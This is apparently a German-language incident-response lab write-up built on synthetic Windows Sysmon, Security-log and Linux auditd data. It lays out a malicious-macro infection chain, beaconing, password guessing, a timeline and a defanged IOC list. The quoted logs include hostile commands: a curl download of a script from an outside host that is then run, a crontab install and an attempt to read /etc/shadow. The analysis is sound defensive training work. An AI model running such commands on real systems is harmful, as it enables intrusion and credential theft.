# Meine Antworten, die Zeitleiste und die IOC-Liste (synthetische Beispiele)

[English](my-timeline.md) · [Français](my-timeline.fr.md) · **Deutsch**

Alle Daten kommen aus den **synthetischen** Dateien in [`samples/`](samples/).
Die Befehle sind die aus dem Lab-README; die unten zitierten Ausgaben sind
das, was ich beim Ausführen bekommen habe (jq 1.7, Audit-Userspace 4.0.2 auf
Debian 13, `TZ=UTC`).

## Teil A — Windows (Sysmon + Security-Log)

Anzahl der Ereignisse nach ID (`jq -r '.EventID' sysmon.synthetic.jsonl | sort | uniq -c`):

```text
      6 1
      2 11
      1 13
      2 22
      5 3
```

Prozesserstellungen (EventID 1), gekürzt:

```text
09:12:03  explorer.exe  -> WINWORD.EXE   /n "C:\Users\c.martin\Downloads\Facture_4471.docm"
09:12:17  WINWORD.EXE   -> powershell.exe -NoP -W Hidden -enc VwByAGkAdABl...
09:12:23  powershell.exe-> C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe --silent
09:14:03  explorer.exe  -> chrome.exe                      (normal user activity)
09:17:03  cmd.exe       -> whoami /all
09:17:05  cmd.exe       -> net group "Domain Admins" /domain
```

Dekodierte `-enc`-Nutzlast (base64 → UTF-16LE):

```text
Write-Output 'SYNTHETIC LAB EVENT - harmless'
```

Netzverbindungen (EventID 3):

```text
09:12:18  powershell.exe  198.51.100.77  cdn-update.example.net  443
09:13:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:14:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:15:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:16:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
```

Fehlgeschlagene Anmeldungen (4625) nach Quelle: `12 203.0.113.45`, `2 10.20.30.57`.

### Antworten

1. **Erstes Dokument / Benutzer:** `Facture_4471.docm` (Word-Datei mit Makros,
   im Ordner Downloads), geöffnet von `CORP\c.martin` auf `WS-COMPTA-07` um
   09:12:03 UTC.
2. **Prozesskette:** `explorer.exe → WINWORD.EXE → powershell.exe (versteckt,
   kodiert) → synchelper.exe`. Dass Word PowerShell startet, ist die
   entscheidende Anomalie — Office hat keinen normalen Grund, einen
   Skript-Interpreter zu starten.
3. **Kontakt / Ablage:** PowerShell hat `cdn-update.example.net` →
   `198.51.100.77` aufgelöst (Sysmon 22), sich auf 443 verbunden (Sysmon 3)
   und `C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe` geschrieben
   (Sysmon 11, 09:12:20), das es 3 s später gestartet hat.
4. **Persistenz:** Sysmon 13 um 09:12:21, Wert
   `HKU\S-1-5-21-…-1105\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper`
   = `C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe` — ein
   Run-Schlüssel pro Benutzer, der auf einen vom Benutzer beschreibbaren Pfad
   zeigt.
5. **Beacon-Intervall:** 09:13:23, 09:14:23, 09:15:23, 09:16:23 → genau
   **60 s**, kein Jitter. Vollkommene Regelmäßigkeit ist typisch für einen
   automatischen Rückruf.
6. **Discovery:** `whoami /all`, dann `net group "Domain Admins" /domain` um
   09:17. Der zweite Befehl listet die am stärksten privilegierten Konten —
   das übliche nächste Ziel. Lücke, die mir aufgefallen ist: es gibt kein
   Sysmon-1-Ereignis für den Elternprozess von `cmd.exe`, also kann ich aus
   diesen Beispielen nicht sagen, was es gestartet hat (auf dem echten Host
   würde ich nach einem fehlenden Ereignis oder einem anderen Elternprozess
   suchen).
7. **4625 SubStatus:** `0xc0000064` = der Benutzername existiert nicht;
   `0xc000006a` = der Benutzer existiert, falsches Passwort. Von
   `203.0.113.45` 12 Fehlversuche in etwa 2,5 Minuten über 6 Namen
   (`administrator`, `admin`, `c.martin`, `j.dupont`, `scanner`, `backup`),
   Anmeldetyp 3 (Netz), kein Arbeitsplatzname → automatisches Passwortraten
   von außen, und die Mischung der beiden Codes sagt mir, welche Namen echte
   Konten sind (`administrator`, `c.martin`, `j.dupont`). Die zwei
   Fehlversuche von `10.20.30.57` (`WS-COMPTA-07`, Benutzer `c.martin`) sehen
   nach gewöhnlichen Tippfehlern aus.

## Teil B — Linux (auditd)

`aureport -if auditd.synthetic.log -au` (TZ=UTC):

```text
1. 09/14/26 21:40:00 deploy 203.0.113.45 ssh /usr/sbin/sshd no 2001
2. 09/14/26 21:40:03 deploy 203.0.113.45 ssh /usr/sbin/sshd no 2002
3. 09/14/26 21:40:09 deploy 203.0.113.45 ssh /usr/sbin/sshd yes 2003
```

Sitzung 7 (`ausearch --session 7 -i | grep -E 'proctitle|USER_'`), gekürzt:

```text
21:40:10  USER_LOGIN  auid=1002 addr=203.0.113.45 res=success
21:40:30  id
21:40:45  curl -s -o /tmp/.cache-upd.sh http://198.51.100.77/update.sh
21:40:52  chmod +x /tmp/.cache-upd.sh
21:40:55  bash /tmp/.cache-upd.sh
21:40:57  crontab /tmp/.c
21:40:58  cat /etc/shadow   -> openat success=no exit=EACCES key=shadow_read
```

Hinweis: `aureport`/`ausearch` geben „Error opening config file (Permission
denied)“ aus, wenn man sie als normaler Benutzer startet; mit `-if` ist das
harmlos (Rückfall auf die eingebauten Vorgaben). Ohne `TZ=UTC` stehen die
Zeiten in Ortszeit — merken, wenn man eine UTC-Zeitleiste baut.

### Antworten

1. `203.0.113.45`: zwei fehlgeschlagene SSH-Anmeldungen, dann ein Erfolg für
   **`deploy`** innerhalb von 9 Sekunden.
2. Folge oben: Aufklärung (`id`) → Download in eine versteckte Datei in
   `/tmp` → ausführbar machen → starten → eine Crontab einrichten →
   `/etc/shadow` lesen wollen.
3. `auid` (Audit-/Anmelde-UID) wird bei der Anmeldung gesetzt und **überlebt
   `sudo`/`su`**, zeigt also weiter auf das Konto, das sich angemeldet hat
   (hier 1002 = `deploy`), auch wenn der Prozess später als root läuft.
   `uid` zeigt nur die aktuelle Identität.
4. Das Lesen von `/etc/shadow` ist mit `EACCES` fehlgeschlagen. Ein
   fehlgeschlagener Versuch zeigt trotzdem die Absicht (Zugriff auf
   Zugangsdaten) und belegt, dass die Sitzung feindlich ist — ein gewöhnlicher
   Benutzer `deploy` hat keinen Grund, die Datei zu lesen.
5. Nächste Prüfungen auf einem echten Host: `crontab -l -u deploy`, Hash und
   Inhalt von `/tmp/.cache-upd.sh` und `/tmp/.c`, ausgehende Verbindungen
   (`ss -tnp`) und Firewall-/Proxy-Logs für `198.51.100.77`, weitere
   Anmeldungen von `203.0.113.45`, ob das Passwort von `deploy` woanders
   wiederverwendet wird, dann eindämmen (Konto sperren, IP blocken) und
   eskalieren.

## Teil C — Zeitleiste (UTC, 2026-09-14)

| Zeit | Host | Quelle | Ereignis | Bedeutung |
|------|------|--------|----------|-----------|
| 07:55:00–07:57:23 | SRV-FILES-01 | Security 4625 | 12 fehlgeschlagene Netzanmeldungen von 203.0.113.45, 6 Benutzernamen | Passwortraten; verrät gültige Namen |
| 07:55:40, 08:01:40 | SRV-FILES-01 | Security 4625 | c.martin von 10.20.30.57 | Wahrscheinlich Tippfehler des Benutzers (harmlos) |
| 09:12:03 | WS-COMPTA-07 | Sysmon 1 | c.martin öffnet `Facture_4471.docm` | Erstzugriff (bösartiges Dokument) |
| 09:12:17 | WS-COMPTA-07 | Sysmon 1 | WINWORD → verstecktes kodiertes PowerShell | Ausführung |
| 09:12:18 | WS-COMPTA-07 | Sysmon 22/3 | DNS + HTTPS zu cdn-update.example.net (198.51.100.77) | Download / C2 |
| 09:12:20 | WS-COMPTA-07 | Sysmon 11 | `synchelper.exe` nach AppData\Roaming geschrieben | Payload abgelegt |
| 09:12:21 | WS-COMPTA-07 | Sysmon 13 | HKU\…\Run\SyncHelper | Persistenz |
| 09:12:23 | WS-COMPTA-07 | Sysmon 1 | synchelper.exe --silent | Payload läuft |
| 09:13:23–09:16:23 | WS-COMPTA-07 | Sysmon 3 | Verbindungen alle 60 s zu 198.51.100.77:443 | Beaconing |
| 09:17:03–05 | WS-COMPTA-07 | Sysmon 1 | `whoami /all`, `net group "Domain Admins" /domain` | Discovery |
| 21:40:00–09 | web01 | auditd USER_AUTH | 2 Fehlversuche + 1 erfolgreiche SSH-Anmeldung, `deploy`, von 203.0.113.45 | Gültiges Konto nach dem Raten |
| 21:40:45 | web01 | auditd EXECVE | curl nach `/tmp/.cache-upd.sh` von 198.51.100.77 | Werkzeugtransfer |
| 21:40:55 | web01 | auditd EXECVE | `bash /tmp/.cache-upd.sh` | Ausführung aus /tmp |
| 21:40:57 | web01 | auditd EXECVE | `crontab /tmp/.c` | Persistenz |
| 21:40:58 | web01 | auditd SYSCALL | `cat /etc/shadow` verweigert | Versuch, an Zugangsdaten zu kommen |

Verbindung der beiden Geschichten: dieselbe externe Adresse 203.0.113.45
rät morgens Windows-Passwörter und kommt abends auf `web01`, und
198.51.100.77 liefert sowohl die Windows-Payload als auch das Linux-Skript.

## IOC-Liste

Extrahiert mit meinem eigenen Werkzeug
(`cat samples/*.jsonl samples/auditd.synthetic.log | python -m seclab.ioc --defang`),
dann von Hand in intern / extern sortiert:

| Typ | Wert (defanged) | Rolle |
|-----|-----------------|-------|
| IPv4 | 203[.]0[.]113[.]45 | Passwortraten (Windows + SSH) |
| IPv4 | 198[.]51[.]100[.]77 | Payload- / C2-Server |
| Domain | cdn-update[.]example[.]net | Löst zu 198.51.100.77 auf |
| URL | hxxp://198[.]51[.]100[.]77/update.sh | Download des Linux-Skripts |
| Datei | `%APPDATA%\SyncHelper\synchelper.exe` (SHA256-Platzhalter `…0003`) | Windows-Payload |
| Datei | `/tmp/.cache-upd.sh`, `/tmp/.c` | Linux-Skript, Crontab-Datei |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper` | Persistenz |
| Datei | `Facture_4471.docm` | Erstes Dokument |

Das Werkzeug hat auch interne Werte geliefert (`10.20.30.57`, `10.20.30.20`,
`intranet.example.com`, die Lab-Hostnamen) und die Platzhalter-Hashes
legitimer Binärdateien (Word, PowerShell, Chrome, whoami, net). Das ist
Kontext, keine Indikatoren, also habe ich sie weggelassen — der Extraktor
findet Zeichenketten, der Analyst entscheidet, was böswillig ist.
